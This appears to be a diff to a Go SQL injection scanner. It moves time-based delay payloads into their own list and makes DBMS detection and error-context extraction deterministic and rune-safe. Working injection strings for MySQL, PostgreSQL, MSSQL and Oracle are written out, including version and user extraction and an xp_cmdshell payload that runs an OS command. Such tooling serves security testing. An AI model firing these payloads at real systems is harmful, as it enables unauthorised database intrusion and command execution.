@@ -9,6 +9,7 @@ import (
 	"net/http"
 	"net/url"
 	"regexp"
+	"sort"
 	"strings"
 	"time"
 
@@ -161,9 +162,6 @@ func (t *Tester) generatePayloads() []Payload {
 		{"' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--", "MySQL UPDATEXML error"},
 		{"' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--", "MySQL group by error"},
 		{"' UNION SELECT @@version,NULL,NULL--", "MySQL version union"},
-		{"'; SELECT SLEEP(5)--", "MySQL stacked sleep"},
-		{"' AND IF(1=1,SLEEP(5),0)--", "MySQL conditional sleep"},
-		{"' AND BENCHMARK(5000000,MD5('test'))--", "MySQL benchmark delay"},
 	}
 
 	for _, p := range mysqlPayloads {
@@ -181,8 +179,6 @@ func (t *Tester) generatePayloads() []Payload {
 		desc  string
 	}{
 		{"' AND CAST((SELECT version()) AS int)--", "PostgreSQL version cast error"},
-		{"';SELECT pg_sleep(5)--", "PostgreSQL stacked sleep"},
-		{"' AND (SELECT pg_sleep(5))--", "PostgreSQL subquery sleep"},
 		{"' UNION SELECT version(),NULL,NULL--", "PostgreSQL version union"},
 		{"' AND 1=CAST((SELECT current_user) AS int)--", "PostgreSQL user extraction"},
 	}
@@ -202,8 +198,6 @@ func (t *Tester) generatePayloads() []Payload {
 		desc  string
 	}{
 		{"' AND 1=CONVERT(int,(SELECT @@version))--", "MSSQL version convert error"},
-		{"';WAITFOR DELAY '0:0:5'--", "MSSQL stacked waitfor"},
-		{"' AND IF 1=1 WAITFOR DELAY '0:0:5'--", "MSSQL conditional waitfor"},
 		{"' UNION SELECT @@version,NULL,NULL--", "MSSQL version union"},
 		{"'; EXEC xp_cmdshell('whoami')--", "MSSQL xp_cmdshell"},
 	}
@@ -224,7 +218,6 @@ func (t *Tester) generatePayloads() []Payload {
 	}{
 		{"' AND CTXSYS.DRITHSX.SN(user,(SELECT banner FROM v$version WHERE ROWNUM=1))=1--", "Oracle context error"},
 		{"' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--", "Oracle UTL_INADDR error"},
-		{"' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--", "Oracle pipe delay"},
 		{"' UNION SELECT banner,NULL,NULL FROM v$version--", "Oracle version union"},
 	}
 
@@ -273,6 +266,13 @@ func (t *Tester) generatePayloads() []Payload {
 		{"';WAITFOR DELAY '0:0:5'--", DBMSMSSQL, 5 * time.Second, "MSSQL WAITFOR DELAY"},
 		{"' WAITFOR DELAY '0:0:5'--", DBMSMSSQL, 5 * time.Second, "MSSQL WAITFOR"},
 		{"' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", DBMSOracle, 5 * time.Second, "Oracle RECEIVE_MESSAGE"},
+		// Stacked/conditional variants moved from DBMS-specific error sections
+		{"'; SELECT SLEEP(5)--", DBMSMySQL, 5 * time.Second, "MySQL stacked SLEEP"},
+		{"' AND BENCHMARK(5000000,MD5('test'))--", DBMSMySQL, 5 * time.Second, "MySQL BENCHMARK delay"},
+		{"' AND (SELECT pg_sleep(5))--", DBMSPostgreSQL, 5 * time.Second, "PostgreSQL subquery pg_sleep"},
+		{"';WAITFOR DELAY '0:0:5'--", DBMSMSSQL, 5 * time.Second, "MSSQL stacked WAITFOR"},
+		{"' AND IF 1=1 WAITFOR DELAY '0:0:5'--", DBMSMSSQL, 5 * time.Second, "MSSQL conditional WAITFOR"},
+		{"' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=1--", DBMSOracle, 5 * time.Second, "Oracle DBMS_PIPE delay"},
 	}
 
 	for _, p := range timePayloads {
@@ -454,10 +454,16 @@ var errorPatterns = map[DBMS][]*regexp.Regexp{
 
 // detectDBMS detects the DBMS from error messages
 func detectDBMS(body string) DBMS {
-	for dbms, patterns := range errorPatterns {
+	dbmsNames := make([]DBMS, 0, len(errorPatterns))
+	for dbms := range errorPatterns {
+		dbmsNames = append(dbmsNames, dbms)
+	}
+	sort.Slice(dbmsNames, func(i, j int) bool { return dbmsNames[i] < dbmsNames[j] })
+	for _, dbms := range dbmsNames {
 		if dbms == DBMSGeneric {
 			continue
 		}
+		patterns := errorPatterns[dbms]
 		for _, pattern := range patterns {
 			if pattern.MatchString(body) {
 				return dbms
@@ -477,19 +483,28 @@ func containsError(body string) (bool, string) {
 		return false, ""
 	}
 
-	for _, patterns := range errorPatterns {
+	dbmsNames := make([]DBMS, 0, len(errorPatterns))
+	for dbms := range errorPatterns {
+		dbmsNames = append(dbmsNames, dbms)
+	}
+	sort.Slice(dbmsNames, func(i, j int) bool { return dbmsNames[i] < dbmsNames[j] })
+	for _, dbms := range dbmsNames {
+		patterns := errorPatterns[dbms]
 		for _, pattern := range patterns {
 			if loc := pattern.FindStringIndex(body); loc != nil {
-				// Extract context around the match
-				start := loc[0] - 50
+				// Extract context around the match (rune-safe slicing)
+				runes := []rune(body)
+				runeStart := len([]rune(body[:loc[0]]))
+				runeEnd := len([]rune(body[:loc[1]]))
+				start := runeStart - 50
 				if start < 0 {
 					start = 0
 				}
-				end := loc[1] + 50
-				if end > len(body) {
-					end = len(body)
+				end := runeEnd + 50
+				if end > len(runes) {
+					end = len(runes)
 				}
-				return true, body[start:end]
+				return true, string(runes[start:end])
 			}
 		}
 	}
